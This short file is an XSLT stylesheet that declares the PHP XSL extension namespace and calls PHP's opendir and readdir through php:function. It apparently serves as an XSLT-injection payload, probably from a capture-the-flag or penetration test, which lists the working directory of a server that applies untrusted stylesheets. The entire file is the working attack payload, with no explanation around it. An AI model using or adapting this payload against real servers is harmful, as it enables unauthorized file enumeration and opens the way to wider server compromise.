<?xml version='1.0'?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<xsl:output method="html"/>
<xsl:template match="/">
	<html>
		<body>
			<h3>BRUH</h3>
			<ul>
				<li>
					<xsl:value-of select="php:function('opendir','.')"/>
					<xsl:value-of select="php:function('readdir')"/>
					<xsl:value-of select="php:function('readdir')"/>
					<xsl:value-of select="php:function('readdir')"/>
				</li>
			</ul>
		</body>
	</html>
</xsl:template>
</xsl:stylesheet>
